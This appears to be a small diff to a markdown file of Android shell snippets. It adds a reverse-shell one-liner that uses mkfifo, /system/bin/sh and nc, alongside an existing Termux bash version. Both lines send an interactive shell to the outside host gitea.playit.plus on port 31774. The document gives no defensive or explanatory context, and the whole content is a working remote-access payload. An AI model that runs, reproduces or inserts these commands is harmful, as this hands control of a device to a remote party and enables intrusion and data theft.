@@ -1,4 +1,9 @@
 ```
+rm -f /data/local/tmp/f; mkfifo /data/local/tmp/f; cat /data/local/tmp/f | /system/bin/sh -i 2>&1 | nc gitea.playit.plus 31774 > /data/local/tmp/f
+```
+
+
+```
 rm -f /data/data/com.termux/files/usr/tmp/f; mkfifo /data/data/com.termux/files/usr/tmp/f; cat /data/data/com.termux/files/usr/tmp/f | /data/data/com.termux/files/usr/bin/bash -i 2>&1 | toybox nc gitea.playit.plus 31774 > /data/data/com.termux/files/usr/tmp/f
 ```
 
